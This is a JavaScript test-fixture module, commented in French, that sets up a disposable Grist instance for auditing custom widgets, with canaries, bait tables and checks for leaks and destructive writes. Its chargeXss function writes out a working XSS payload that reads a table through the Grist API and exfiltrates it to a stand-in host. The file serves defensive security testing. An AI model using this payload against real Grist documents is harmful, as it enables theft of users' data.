/**
 * Données jetables de l'audit « Grist réel » : générées ici, jamais importées. Aucune ligne d'un vrai
 * document n'entre dans l'essai.
 *
 * Le document de départ est celui de la V1 (`documentDeTest`), avec trois différences voulues :
 *  - des « canaris » : des valeurs uniques (préfixe `GWC-<graine>-`) posées dans une colonne
 *    dédiée de la table, et dans la table appât. Tout ce qui sort du widget est cherché pour elles :
 *    un canari qui arrive à l'extérieur est une fuite PROUVÉE, pas supposée ;
 *  - la charge XSS de la V1, qui signalait par `window.parent` (impossible depuis un vrai Grist, où le
 *    widget est sur sa propre origine), est remplacée par une charge qui s'observe dans le cadre du
 *    widget lui-même, tente de lire la table appât par l'API Grist avec le niveau réellement accordé,
 *    puis de la sortir par une requête image (l'enchaînement « XSS, lecture, exfiltration ») ;
 *  - le document est créé par l'API REST de l'instance jetable, section Custom comprise.
 */
import crypto from 'node:crypto';
import { documentDeTest } from '../dynamique.js';

/** Hôte factice de la sortie : jamais joignable, intercepté par la route du navigateur avant toute sortie. */
export const HOTE_PUITS = 'puits.gwaudit.invalid';
/** Hôte factice des essais de canaux de sortie (essai 22) : distinct du puits, pour que ces requêtes ne se mêlent jamais à celles de l'essai 1 ou 13. */
export const HOTE_CANAUX = 'canaux.gwaudit.invalid';

/**
 * Les tables sacrifiées de l'essai 10 (écritures destructrices) : une par effet à mesurer, pour que l'audit vérifie chaque effet côté serveur, sans
 * croire ce que le widget rapporte. Chacune a deux colonnes (`Valeur`, `Autre`) et une ligne ; la table `regle` reçoit une règle d'accès.
 */
export const TABLES_SACRIFIEES = { ajout: 'GwauditEcrAjout', renom: 'GwauditEcrRenom', colonne: 'GwauditEcrColonne', table: 'GwauditEcrTable', regle: 'GwauditEcrRegle' };

/** Un identifiant Grist valide à partir d'un nom de colonne ou de table (Grist retire le `_` initial et les caractères hors [A-Za-z0-9_]). */
function idGrist(nom, parDefaut) {
  const propre = String(nom).normalize('NFD').replace(/[̀-ͯ]/g, '').replace(/[^A-Za-z0-9_]/g, '_').replace(/^_+/, '');
  return /^[A-Za-z]/.test(propre) ? propre : (propre ? `C${propre}` : parDefaut);
}
const idTable = (nom) => { const i = idGrist(nom, 'Table'); return i[0].toUpperCase() + i.slice(1); };

export function chargeXss(idAppat) {
  const sortie = `http://${HOTE_PUITS}/xss?d=`;
  return `<img src=x onerror="window.__gw_xss=(window.__gw_xss||0)+1;try{window.grist.docApi.fetchTable('${idAppat}').then(function(t){window.__gw_lu=JSON.stringify(t);(new Image).src='${sortie}'+encodeURIComponent(window.__gw_lu)}).catch(function(e){window.__gw_refus=String(e&&e.message||e)})}catch(e){window.__gw_err=String(e)}">`;
}

/** Les valeurs de la table de test, prêtes à être envoyées à Grist ; fonction pure, testée sans instance. */
export function construireJeu(scenario, graine = crypto.randomBytes(4).toString('hex')) {
  const v1 = documentDeTest(scenario);
  const appatV1 = v1.tablesAppats[0];
  const idAppat = idTable(appatV1.tableId);
  const prefixe = `GWC-${graine}`;
  const xss = chargeXss(idAppat);

  const brutes = Object.entries(v1.colonnes).filter(([nom]) => nom !== 'id');
  const nbLignes = Math.max(1, ...brutes.map(([, v]) => (Array.isArray(v) ? v.length : 1)));
  const colonnes = []; // { id, type, valeurs, origine }
  const dejaPris = new Set();
  for (const [nom, v] of brutes) {
    let id = idGrist(nom, 'Col'); let n = 2;
    while (dejaPris.has(id.toLowerCase())) id = `${idGrist(nom, 'Col')}${n++}`;
    dejaPris.add(id.toLowerCase());
    const valeurs = Array.from({ length: nbLignes }, (_, i) => (Array.isArray(v) ? v[i] : v));
    const nettoyees = valeurs.map((x) => (typeof x === 'string' && /onerror\s*=/i.test(x) ? xss : x));
    const tousNombres = nettoyees.every((x) => typeof x === 'number');
    const toutTexte = nettoyees.every((x) => typeof x === 'string' || x == null);
    colonnes.push({ id, origine: nom, type: tousNombres ? 'Numeric' : (toutTexte ? 'Text' : 'Any'), valeurs: nettoyees });
  }
  const idCanari = 'GwauditCanari';
  colonnes.push({ id: idCanari, origine: null, type: 'Text', valeurs: Array.from({ length: nbLignes }, (_, i) => `${prefixe}-LIGNE-${i + 1}`) });

  const libellesAppat = Array.from({ length: Math.max(2, appatV1.colonnes.Libelle.length) }, (_, i) => `${appatV1.colonnes.Libelle[i] ?? 'Ligne supplémentaire'} (${prefixe}-APPAT-${i + 1})`);

  // Valeurs ordinaires du document (adresses, noms…) cherchées elles aussi dans ce qui sort : assez longues pour ne pas coïncider par hasard.
  const valeursCherchees = new Set();
  for (const c of colonnes) {
    if (c.id === idCanari) continue;
    for (const x of c.valeurs) if (typeof x === 'string' && x.length >= 8 && !/onerror\s*=/i.test(x)) valeursCherchees.add(x);
  }

  return {
    graine, prefixe, nbLignes,
    nomDocument: 'gwaudit-grist-reel',
    table: { id: idTable(v1.tableId), colonnes },
    appat: { id: idAppat, colonnes: [{ id: 'Libelle', type: 'Text' }], libelles: libellesAppat },
    valeursCherchees: [...valeursCherchees],
    colonnesRenommees: colonnes.filter((c) => c.origine && c.origine !== c.id).map((c) => ({ de: c.origine, vers: c.id })),
  };
}

/** Dans un texte sorti du widget (adresse, corps), le premier canari trouvé, ou null. Les formes encodées en pourcentage sont lues aussi. */
export function trouverCanari(texte, jeu) {
  if (!texte) return null;
  let decode = texte;
  try { decode = decodeURIComponent(texte.replace(/\+/g, ' ')); } catch { /* texte non encodé */ }
  for (const t of new Set([texte, decode])) {
    const m = t.match(new RegExp(`${jeu.prefixe}-[A-Z0-9-]+`));
    if (m) return m[0];
    for (const v of jeu.valeursCherchees) if (t.includes(v)) return v;
  }
  return null;
}

/**
 * Crée le document, ses deux tables et leurs lignes dans l'instance jetable.
 * @returns {Promise<{docId: string, tableId: string, tableRef: number, colonnesRef: Object<string, number>}>}
 */
export async function creerDocument(client, jeu) {
  const espace = (await client.espaces()).find((w) => !w.isSupportWorkspace) ?? (await client.espaces())[0];
  if (!espace) throw new Error("l'instance jetable n'a aucun espace de travail");
  const docId = await client.creerDocument(espace.id, jeu.nomDocument);

  await client.creerTable(docId, jeu.table.id, jeu.table.colonnes.map((c) => ({ id: c.id, type: c.type })));
  const lignes = Array.from({ length: jeu.nbLignes }, (_, i) => Object.fromEntries(jeu.table.colonnes.map((c) => [c.id, c.valeurs[i] ?? null])));
  await client.ajouterLignes(docId, jeu.table.id, lignes);

  await client.creerTable(docId, jeu.appat.id, jeu.appat.colonnes);
  await client.ajouterLignes(docId, jeu.appat.id, jeu.appat.libelles.map((l) => ({ Libelle: l })));

  for (const id of Object.values(TABLES_SACRIFIEES)) {
    await client.creerTable(docId, id, [{ id: 'Valeur', type: 'Text' }, { id: 'Autre', type: 'Text' }]);
    await client.ajouterLignes(docId, id, [{ Valeur: 'a', Autre: 'b' }]);
  }

  const t = await client.sql(docId, 'select id from _grist_Tables where tableId = ?', [jeu.table.id]);
  const tableRef = t.records[0].fields.id;
  const cols = await client.sql(docId, 'select id, colId from _grist_Tables_column where parentId = ?', [tableRef]);
  const colonnesRef = Object.fromEntries(cols.records.map((r) => [r.fields.colId, r.fields.id]));
  return { docId, tableId: jeu.table.id, tableRef, colonnesRef };
}

/**
 * Un second document de l'instance jetable, sans rapport avec le widget, qui contient un canari : il sert à vérifier qu'un jeton d'accès
 * obtenu par le widget ne donne pas accès à un autre document (essai 9). Il est créé après le contrôle d'isolation de départ.
 */
export async function creerDocumentVoisin(client, jeu) {
  const espace = (await client.espaces()).find((w) => !w.isSupportWorkspace) ?? (await client.espaces())[0];
  const docId = await client.creerDocument(espace.id, 'gwaudit-autre-document');
  const canari = `${jeu.prefixe}-AUTREDOC-1`;
  await client.creerTable(docId, 'Secret', [{ id: 'Valeur', type: 'Text' }]);
  await client.ajouterLignes(docId, 'Secret', [{ Valeur: canari }]);
  return { docId, canari };
}

/** Ajoute à la page du document une section « Custom » et rend les références de la section et de la page. */
export async function creerSectionCustom(client, doc) {
  const r = await client.actions(doc.docId, [['CreateViewSection', doc.tableRef, 0, 'custom', null, null]]);
  const { sectionRef, viewRef } = r.retValues[0];
  return { sectionRef, viewRef, chemin: `/o/docs/${doc.docId}/gwaudit/p/${viewRef}` };
}

/** Règle l'adresse du widget, le niveau d'accès accordé et la correspondance des colonnes de la section. */
export async function reglerSection(client, doc, section, { url, access, columnsMapping }) {
  const customView = { mode: 'url', url, access, ...(columnsMapping ? { columnsMapping } : {}) };
  const options = JSON.stringify({ customView: JSON.stringify(customView) });
  await client.actions(doc.docId, [['UpdateRecord', '_grist_Views_section', section.sectionRef, { options }]]);
}

/**
 * Correspondance des colonnes que le widget a déclarées (`columns` de grist.ready) avec celles du
 * document : même nom (sans tenir compte de la casse), à défaut la première colonne de texte encore libre.
 */
export function proposerCorrespondance(declarees, doc, jeu) {
  if (!Array.isArray(declarees) || !declarees.length) return null;
  const dispo = jeu.table.colonnes.filter((c) => c.id !== 'GwauditCanari');
  const prises = new Set();
  const choisir = (nom) => {
    const exacte = dispo.find((c) => !prises.has(c.id) && (c.id.toLowerCase() === nom.toLowerCase() || String(c.origine).toLowerCase() === nom.toLowerCase()));
    const choix = exacte ?? dispo.find((c) => !prises.has(c.id) && c.type === 'Text');
    if (choix) prises.add(choix.id);
    return choix;
  };
  const mapping = {};
  for (const d of declarees) {
    const nom = typeof d === 'string' ? d : d?.name;
    if (!nom) continue;
    const choix = choisir(nom);
    if (!choix) continue;
    const ref = doc.colonnesRef[choix.id];
    mapping[nom] = (typeof d === 'object' && d.allowMultiple) ? [ref] : ref;
  }
  return Object.keys(mapping).length ? mapping : null;
}

/**
 * Ce que l'écriture du widget a réellement changé dans le document, lu par l'audit côté serveur (jamais d'après ce que le widget rapporte).
 * À appeler après la passe des écritures (voir kit.js, kitEcritures). Chaque valeur : true = l'effet est dans le document, false = non.
 * @returns {Promise<{ajout: boolean, renom: boolean, colonne: boolean, table: boolean, regle: boolean}>}
 */
export async function verifierEcritures(client, doc) {
  const lire = async (requete, args = []) => (await client.sql(doc.docId, requete, args)).records.map((r) => r.fields);
  const T = TABLES_SACRIFIEES;
  const colonnes = async (tableId) => (await lire('select c.colId from _grist_Tables_column c join _grist_Tables t on c.parentId = t.id where t.tableId = ?', [tableId])).map((x) => x.colId);
  const tables = (await lire('select tableId from _grist_Tables')).map((x) => x.tableId);
  const lignes = (await lire(`select count(*) as n from "${T.ajout}"`))[0]?.n;
  const colRenom = await colonnes(T.renom); const colColonne = await colonnes(T.colonne);
  const regles = await lire('select r.permissionsText as p from _grist_ACLRules r join _grist_ACLResources res on r.resource = res.id where res.tableId = ?', [T.regle]);
  return {
    ajout: lignes === 2,
    renom: colRenom.includes('ValeurRenommee') && !colRenom.includes('Valeur'),
    colonne: colColonne.includes('Valeur') && !colColonne.includes('Autre'),
    table: !tables.includes(T.table),
    regle: regles.some((r) => r.p === '-R'),
  };
}
